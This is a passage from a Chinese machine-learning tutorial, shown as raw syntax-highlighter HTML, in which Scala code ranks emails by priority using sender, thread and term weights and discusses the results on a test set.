&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;commonTermsWeight&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termsInMailBody&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-46&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;termsInMailBody&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-47&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-48&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tdm&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;collectFirst&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-49&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getOrElse&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-50&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-51&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termsInMailBody&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-52&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-53&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-54&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rank&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;termWeight *&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-55&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;threadGroupWeight *&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-56&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;commonTermsWeight *&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-57&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;senderWeight&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-58&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-59&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rank&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-60&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-61&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-62&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-63&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;priorityEmails&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;testingRanks&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-64&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mean&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-65&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-66&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;priorityEmails&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; ranked as priority&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0088 seconds] --&gt;
&lt;p&gt;在实际执行了这个测试代码以后，你将看到这个测试集被标记为优先级的邮件数量实际是 563，占到测试集邮件数的 45%。这是一个相当大的值，所以我们可以用决策边界进行调节。不过，我们仅以此作为说明的目的，这个值并不应该拿去代表实际情况，所以我们就不再去纠结那个百分比。反之，我们来看看优先级邮件中评级最高的10封。&lt;/p&gt;
&lt;p&gt;注意我已经将电子邮件地址的部分内容删除了，以防止垃圾邮件程序抓取这些地址。从下表中可以看到，这10封优先级最高的邮件中，大部分邮件都来自不同的会话，这些会话的活动性很高。以评级最高的那封邮件为例，这封邮件是一封9分钟前的邮件的回复。这就表明了这个邮件会话的重要性。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2015/10/131beec07763d85d52ebb6174fa53690.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-59784&quot; src=&quot;/images/jobbole.com/312d77a45acb45bd93ce0329157014fd.jpg&quot; alt=&quot;asdf&quot; width=&quot;795&quot; height=&quot;480&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;此外，我们还看到 tim.One… 在这个表中出现很多次。这反映出他的所有邮件都很重要，或者，他发送了这么多邮件以致排序系统自动将其评为优先。作为这个实例的最后一步，我们对这一点再做些讨论：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d06138c622835664&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
val timsEmails = testingRanks
    .filter(x =&amp;gt; x._1.sender == &quot;tim.one@...&quot;)
    .sortBy(x =&amp;gt; -x._2)
timsEmails
    .foreach(x =&amp;gt; println(  &quot;| &quot; +
                            x._1.emailDate +
                            &quot; | &quot;  +
                            x._1.subject + 
                            &quot; | &quot; +
                            df.format(x._2) + 
                            &quot; |&quot;)
                         )&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06138c622835664-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06138c622835664-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06138c622835664-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06138c622835664-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06138c622835664-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06138c622835664-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06138c622835664-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06138c622835664-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06138c622835664-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06138c622835664-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06138c622835664-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06138c622835664-12&quot;&gt;12&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06138c622835664-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;timsEmails&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;testingRanks&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06138c622835664-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;tim.one@...&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06138c622835664-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06138c622835664-4&quot;&gt;&lt;span class=&quot;crayon-i&quot;&gt;timsEmails&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06138c622835664-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;| &quot;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06138c622835664-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                            &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;emailDate&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06138c622835664-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                            &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; | &quot;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06138c622835664-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                            &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06138c622835664-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                            &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; | &quot;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06138c622835664-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                            &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;df&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06138c622835664-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                            &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; |&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06138c622835664-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                         &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0022 seconds] --&gt;
&lt;p&gt;运行这一段代码后，一个包含 45 封邮件的列表就会被打印出来，评级最低的 10 封邮件如下：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2015/10/5ca892fe75b7941ed1b2f08fd8e94077.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-59785&quot; src=&quot;/images/jobbole.com/6dbeb1806a2e956a35b0279f7abbd632.jpg&quot; alt=&quot;xxx&quot; width=&quot;799&quot; height=&quot;264&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们知道决策边界就是平均值，这里是 25.06，那么可以看出，Tim 只有一封邮件没有被标记为优先级。这表明，一方面，我们的决策边界太低了，而另一方面，Tim也许真的发送了很多重要邮件，否则很多邮件的评级就会低于决策边界。不幸的是，我们无法为你提供确切的答案，因为我们不是这些测试数据的原主人。&lt;/p&gt;
&lt;p&gt;当你手中的数据并非一手数据时，验证一个像这样的排序系统是相当困难的。验证并改善这个系统最常用的方式是将它开放给客户使用，让他们标记、纠正错误。而这些纠错就可以用来改善系统。&lt;/p&gt;
&lt;p&gt;总的来说，我们介绍了如何从含有异常值的原始数据中获取特征，以及如何把这些特征耦合到最终的排序值中。此外，我们还尝试对这些特征进行验证，但由于缺乏对数据集的确切把握，我们无法得出明确的结论。不过，如果你想使用自己的直接数据进行同样的过程，那么这个实例就可以帮助你建立自己的排序系统。&lt;/p&gt;
